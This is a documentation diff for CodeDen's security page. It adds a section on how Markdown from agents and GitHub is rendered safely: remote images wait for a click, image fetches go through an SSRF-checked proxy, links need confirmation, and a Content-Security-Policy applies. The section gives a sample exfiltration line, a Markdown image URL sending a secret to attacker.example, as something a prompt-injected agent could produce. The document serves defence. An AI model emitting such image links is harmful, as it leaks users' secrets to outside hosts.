@@ -27,6 +27,24 @@ Off by default. When you turn it on:
 - **Signed-in devices** are listed in Settings with **Sign out** and **Sign out all**; signing out (or turning access off) also closes their open connections.
 - Network access serves plain **http**: use it on networks you trust, or over your own VPN (Tailscale, WireGuard). Never forward the port to the internet.
 
+## Markdown from agents and GitHub
+
+Agent and PM replies, the orchestrator, plan approvals, factory inbox items, GitHub issue and pull request bodies and comments, and release notes are all Markdown that CodeDen didn't write. A prompt-injected agent (even a read-only PM) or a stranger's issue could add an image whose URL carries data, such as `![](https://attacker.example/?d=<secret>)`. A browser fetches an image the moment it's shown, so CodeDen never loads an image from another host on its own:
+
+- **Remote images wait for you.** They show as a placeholder naming the image's host; hover it for the full URL. **Load image** loads that one image, and it stays loaded until you reload the page. Images that never leave this machine show at once: inline `data:` and `blob:` images, and CodeDen's own stored files (`/api/artifacts/<id>` on CodeDen's own address). Other addresses on CodeDen's server, relative paths and other schemes are never loaded. `<picture>` sources are dropped, so they can't stand in for a held-back image.
+- **Loaded images come through CodeDen's server** (`/api/remote-image`), because the page itself may only load images from CodeDen (see the policy below). The server fetches only `http` and `https` URLs on **public internet addresses**. It never contacts this computer, your LAN, link-local, VPN (`100.64.0.0/10`) or other special ranges. Every address a name resolves to is checked when the server connects, so DNS can't point a name at them. The server sends no cookies, credentials or referrer. It follows at most three redirects, each checked the same way. It passes on only images (PNG, JPEG, GIF, WebP, AVIF, BMP, ICO, SVG) up to 10 MB, fetched within 15 seconds. It serves them like stored files: `nosniff` and a sandboxing policy, so an SVG opened on its own can't run script. Like every API route it needs the install token, or a signed-in device's session.
+- **Links show where they go.** Clicking a link in Markdown opens a dialog with its real address, **Copy link** and **Open link**. Nothing opens until you choose. `javascript:` and `data:` links are refused and shown as plain text.
+- **Content-Security-Policy.** The server sends this policy with the UI and with every other response that has no stricter one of its own, the "CodeDen is locked" page included:
+
+  ```text
+  default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
+  img-src 'self' data: blob:; font-src 'self' data:; media-src 'self' data: blob:;
+  connect-src 'self' ws://<host> wss://<host>; worker-src 'self' blob:;
+  object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'
+  ```
+
+  Even if Markdown got an image past the renderer, the browser would refuse to load it from anywhere but CodeDen. The policy also allows no inline or remote script and no `eval`, keeps network requests and WebSockets on CodeDen, and stops other sites from framing the UI. Inline styles are allowed (UI components set them), but nothing can load through them from elsewhere. The desktop app sets the same policy on its window for everything from the server, alongside any policy the server sent. A server without one still gets it, and a stricter one, such as a stored file's, stays strict. The development UI that `pnpm dev` serves on Vite's port has no policy.
+
 ## Agents and MCP
 
 - Each agent session gets its own **MCP token** for CodeDen's internal MCP server, minted when the session starts or resumes, **stored only as a SHA-256 hash**, and **revoked** when the session stops, completes or fails. The install token is not accepted on the MCP endpoint, and MCP tokens are not accepted by the UI API.
@@ -172,4 +190,4 @@ Automatic merging only exists in the experimental Software factory and Dark fact
 
 ## Data and telemetry
 
-Everything stays in `~/.codeden/` on your machine. CodeDen has no accounts and no hosted backend, and sends no telemetry. The only outbound traffic is your agents talking to their providers, GitHub through your `gh` login, the optional image and voice engines you turn on, and, unless you set **Updates** to *Off* in Settings > General, a request on start and every 6 hours to the npm registry for the latest `codeden` version (nothing about you or your projects is sent). Installing an update downloads that version from npm, and **What's new** fetches its release notes from GitHub when you open it. **Import › Link** on the Automations page downloads the link you paste, once, with no cookies, tokens or credentials, and only from the public internet: never this computer or a private network, whether by the link, a redirect or a DNS answer (see [Importing from a link](automations.md#importing-from-a-link)).
+Everything stays in `~/.codeden/` on your machine. CodeDen has no accounts and no hosted backend, and sends no telemetry. The only outbound traffic is your agents talking to their providers, GitHub through your `gh` login, the optional image and voice engines you turn on, and, unless you set **Updates** to *Off* in Settings > General, a request on start and every 6 hours to the npm registry for the latest `codeden` version (nothing about you or your projects is sent). Installing an update downloads that version from npm, and **What's new** fetches its release notes from GitHub when you open it. **Import › Link** on the Automations page downloads the link you paste, once, with no cookies, tokens or credentials, and only from the public internet: never this computer or a private network, whether by the link, a redirect or a DNS answer (see [Importing from a link](automations.md#importing-from-a-link)). When you click **Load image** on an image in Markdown, the server fetches that image from its host, under the same rules (see [Markdown from agents and GitHub](#markdown-from-agents-and-github)).
